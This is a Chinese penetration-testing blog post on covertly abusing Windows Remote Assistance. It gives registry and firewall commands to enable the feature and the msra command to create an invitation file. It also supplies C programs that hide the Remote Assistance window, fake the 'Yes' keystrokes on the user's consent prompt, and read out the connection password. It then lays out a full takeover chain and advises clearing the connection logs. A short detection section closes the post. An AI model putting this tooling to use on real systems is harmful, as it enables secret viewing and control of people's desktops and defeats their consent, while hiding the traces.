---
layout: post
title: 渗透技巧——Windows远程协助的隐蔽执行
---


## 0x00 前言
---

对于Windows系统，经常会用到远程桌面服务，通过界面对系统进行远程管理。

这其中存在一个不足：使用远程桌面服务进行远程登录(使用另一用户或是踢掉当前用户)，无法获取到当前用户的系统状态。

如果想要查看(甚至是操作)当前用户的桌面，有什么好办法呢？

虽然我们可以通过编写程序来实现界面操作（捕获桌面信息，压缩传输，发送鼠标键盘消息等），但是如果能够使用Windows系统的默认功能，岂不是更好？

答案就是Windows系统的远程协助。

## 0x01 简介
---

本文将要介绍以下内容：

- 远程协助的基本操作
- 命令行下操作
- 编写c++程序隐藏界面，发送键盘消息，模拟用户点击确认
- 完整利用流程
- 检测方法

## 0x02 远程协助的基本操作
---

### 1、开启远程协助功能

`System Properties` -> `Remote`

选中`Allow Remote Assistance connections to this computer`

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-4/2-1.png)

### 2、添加防火墙规则，允许远程协助的通信端口

`Windows Firewall` -> `Allowed Programs`

选中`Remote Assistance`

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-4/2-2.png)

### 3、启动界面程序

运行 -> `msra.exe`


### 4、配置本机为服务端，请求其他人协助

选中`Invite someone you trust to help you`

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-4/2-3.png)


选中`Save this invitation as a file` 

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-4/2-4.png)

保存为文件`Invitation.msrcincident`

自动弹出界面，生成一个随机密码，记录该密码，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-4/2-5.png)

### 5、控制端发起远程连接

控制端运行文件`Invitation.msrcincident`，填入上一步生成的密码，发起远程连接

### 6、服务端确认连接请求

服务端弹框，需要用户确认，允许远程协助，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-4/2-6.png)

选择Yes，远程协助成功建立


## 0x03 命令行下操作
---

### 1、开启系统远程协助

修改注册表项`HKLM\SYSTEM\CurrentControlSet\Control\Remote Assistance`下的键值`fAllowToGetHelp`，1代表允许，0代表禁止

```
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Remote Assistance" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
```

### 2、配置防火墙规则，允许远程协助的通信端口

```
netsh advfirewall firewall set rule group="Remote Assistance" new enable=Yes
```

### 3、创建远程协助文件，后台等待用户连接

```
msra /saveasfile c:\test\1.msrcIncident 123456789012
```

保存文件路径为`c:\test\1.msrcIncident`，连接密码为`123456789012`



## 0x04 编写c程序隐藏界面，发送键盘消息，模拟用户点击确认
---

### 1、隐藏msra.exe的界面

获得窗口句柄，将窗口属性设置为隐藏

需要注意不同语言的系统中msra.exe的窗口标题不同，例如中文系统的窗口标题为`Windows 远程协助`，英文系统的窗口标题为`Windows Remote Assistance`

可以先对当前系统语言作判断，接着寻找对应的窗口标题

为了使界面完全隐藏，需要加入循环判断，只要找到msra.exe的窗口立即对其隐藏

可供参考的代码如下：

```
#include <windows.h>
int main()
{
	char *Title = NULL;
	LANGID lid = GetSystemDefaultLangID();
	printf("[*]LanguageID:0x%04x\n",lid);
	switch (lid)
	{
		case 0X0804:
			printf("[*]Language:Chinese\n",lid);
			Title = "Windows 远程协助";
			break;
		case 0x0409:
			printf("[*]Language:Englisth\n",lid);
			Title = "Windows Remote Assistance";
			break;
	}
	for(int i=0;i<1;i)
	{
		HWND hwnd = FindWindow(NULL, Title);
		ShowWindow(hwnd, SW_HIDE); 
		Sleep(100);
	}
}
```

编译生成`msra-hide.exe`

### 2、模拟输入键盘消息，左箭头(<-)和回车确认键

正常情况下，控制端成功输入密码后，服务端会弹框提示用户是否允许远程协助

这里通过程序实现模拟用户输入，选中`Yes`，对应的键盘操作为左箭头(<-)和回车确认键

代码如下：

```
#include <windows.h>
int main()
{
	char *Title = NULL;
	LANGID lid = GetSystemDefaultLangID();
	printf("[*]LanguageID:0x%04x\n",lid);
	switch (lid)
	{
		case 0X0804:
			printf("[*]Language:Chinese\n",lid);
			Title = "Windows 远程协助";
			break;
		case 0x0409:
			printf("[*]Language:Englisth\n",lid);
			Title = "Windows Remote Assistance";
			break;
	}
	HWND hwnd = FindWindow(NULL, Title);
	SetActiveWindow(hwnd);
	SetForegroundWindow(hwnd);
	SetFocus(hwnd);
	keybd_event(37,0,0,0);
	keybd_event(37,0,KEYEVENTF_KEYUP,0);
	keybd_event(13,0,0,0);
	keybd_event(13,0,KEYEVENTF_KEYUP,0);
}
```

编译生成`msra-allow.exe`


### 3、扩展：获得远程协助窗口的连接密码

通过枚举子窗口获得连接密码

使用API FindWindow获得窗口句柄

使用API EnumChildWindows遍历窗口所有子窗口，获得密码内容

API EnumChildWindows会自动枚举，直至获得最后一个子窗口或者函数返回0

实际测试发现第二个子窗口保存密码，所以在获得密码后函数返回0提前结束枚举

代码如下：

```
#include <windows.h>
int status = 0;
BOOL CALLBACK EnumMainWindow(HWND hwnd, LPARAM lParam)
{
	const int BufferSize = 1024;
	char BufferContent[BufferSize] = "";
	SendMessage(hwnd, WM_GETTEXT, (WPARAM)BufferSize, (LPARAM)BufferContent);
	status++;
	if (status == 2)
	{
		printf("[+]Find Password\n");      
		printf("%s\n", BufferContent);
		return 0;
	}
	return 1;
}
int main()
{
	char *Title = NULL;
	LANGID lid = GetSystemDefaultLangID();
	printf("[*]LanguageID:0x%04x\n",lid);
	switch (lid)
	{
		case 0X0804:
			printf("[*]Language:Chinese\n",lid);
			Title = "Windows 远程协助";
            break;
       case 0x0409:
			printf("[*]Language:Englisth\n",lid);
			Title = "Windows Remote Assistance";
            break;
    }     
	HWND hwnd = FindWindow(NULL, Title);
	if(hwnd)
	{
		printf("[+]Find Window\n");     
		EnumChildWindows(hwnd, EnumMainWindow, 0);
	}
	else
	{
		printf("[!]No Window\n");  
	}
} 
```

测试如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-4/3-1.png)


## 0x05 完整利用流程
---

### 1、开启远程协助


```
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Remote Assistance" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh advfirewall firewall set rule group="Remote Assistance" new enable=Yes
```

### 2、运行拦截程序msra-hide.exe，隐藏msra窗口

需要管理员权限

### 3、生成远程协助邀请文件

```
msra /saveasfile c:\test\1.msrcIncident 123456789012
```

### 4、控制端进行连接

获得文件`1.msrcIncident`并执行，输入连接密码

### 5、运行模拟键盘输入程序msra-allow.exe，允许远程协助

需要管理员权限

### 6、控制端获得远程协助的桌面

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-4/4-1.png)

### 7、控制端请求获得服务端的鼠标操作权限

在控制界面选择`请求控制`

### 8、再次运行模拟键盘输入程序msra-allow.exe，允许鼠标操作

需要管理员权限

控制端成功获得控制服务端鼠标

至此，成功获得目标系统的桌面操作权限

### 9、清除连接记录

远程协助的记录保存位置：`%SystemDrive%\Users\user_name\Documents\Remote Assistance Logs`

命名规则: `YYYYMMDDHHMMSS.xml` (24小时时间格式)

日志文件内保存连接时间

## 0x06 检测方法
---

本文介绍的方法前提是已经取得了系统的管理员权限，代表该系统已经被攻破

结合利用思路，可以通过以下方法检测：

- 注册表`HKLM\SYSTEM\CurrentControlSet\Control\Remote Assistance`键值被修改
- 防火墙规则被修改
- 启动进程msra.exe
- 生成新文件夹`%SystemDrive%\Users\user_name\Documents\Remote Assistance Logs`
- 开放的异常端口


## 0x07 小结
---

本文对Windows远程协助的功能进行了介绍，编写程序实现Windows远程协助的隐蔽执行，结合利用思路给出检测方法



---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)



